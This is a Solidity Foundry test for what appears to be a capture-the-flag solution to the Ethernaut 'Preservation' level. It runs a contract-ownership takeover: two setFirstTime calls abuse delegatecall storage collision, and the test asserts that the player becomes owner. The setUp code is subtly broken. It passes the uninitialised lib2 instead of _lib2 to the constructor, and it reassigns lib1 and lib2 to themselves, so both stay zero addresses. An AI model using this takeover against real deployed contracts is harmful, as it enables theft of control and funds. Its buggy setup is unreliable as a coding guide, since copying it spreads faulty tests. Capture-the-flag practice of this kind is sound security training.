// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "./Preservation.sol";
import "./Solution.sol";

contract test_solution is Test {
    Preservation level;
    LibraryContract lib1;
    LibraryContract lib2;
    Solution solution;
    address player = makeAddr("player");

    function setUp() public {
        Solution _solution = new Solution();
        LibraryContract _lib1 = new LibraryContract();
        LibraryContract _lib2 = new LibraryContract();
        Preservation _level = new Preservation(address(_lib1), address(lib2));

        level = Preservation(_level);
        lib1 = LibraryContract(lib1);
        lib2 = LibraryContract(lib2);
        solution = Solution(_solution);
    }

    function test_preservation() public {
        console.log("the initial owner is: ", level.owner());
        vm.startPrank(player);
        level.setFirstTime(uint256(uint160(address(solution))));
        level.setFirstTime(uint256(uint160(player)));
        vm.stopPrank();
        assertEq(player, level.owner());
        console.log("Owner has been changed to : ", level.owner());
    }
}
